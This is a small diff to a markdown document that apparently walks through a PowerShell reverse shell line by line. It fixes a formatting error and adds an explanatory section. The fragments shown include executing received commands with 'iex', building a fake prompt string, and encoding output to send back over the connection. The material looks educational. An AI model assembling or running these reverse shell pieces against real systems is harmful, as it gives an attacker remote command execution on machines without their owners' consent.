@@ -69,7 +69,10 @@ $sendback = (iex $data 2>&1 | Out-String);
 
 ### Show Working Directory
 ```powershell
-$sendback2 = $sendback + 'PS ' ```
-+ (pwd).path + '> ';
+$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
+```
 
+### Sets Sendbyte
+```powershell
+$sendbyte = ([text:encoding]::ASCII).GetBytes($sendback)
 ```
